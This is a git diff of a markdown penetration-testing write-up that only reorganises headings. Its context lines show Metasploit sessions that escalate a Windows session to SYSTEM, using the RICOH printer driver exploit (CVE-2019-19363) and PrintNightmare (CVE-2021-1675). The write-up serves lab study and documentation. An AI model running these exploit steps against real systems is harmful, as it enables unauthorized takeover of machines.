@@ -497,7 +497,9 @@ msf6 post(multi/recon/local_exploit_suggester) > run
  14  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 ```
 
-## CVE-2019-19363 - Local privilege escalation in RICOH printer drivers for Windows
+## Privilege Escalation
+
+### CVE-2019-19363 - Local privilege escalation in RICOH printer drivers for Windows
 
 ```bash
 msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ricoh_driver_privesc
@@ -562,7 +564,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-## CVE-2021-1675 - printnightmare
+### CVE-2021-1675 - printnightmare
 
 ```bash
 msf6 exploit(windows/local/ricoh_driver_privesc) > search printnightmare
@@ -646,7 +648,7 @@ meterpreter > getuid
 Server username: NT AUTHORITY\SYSTEM
 ```
 
-## Extra
+### Extra
 
 ```bash
 msf6 exploit(windows/dcerpc/cve_2021_1675_printnightmare) > sessions 
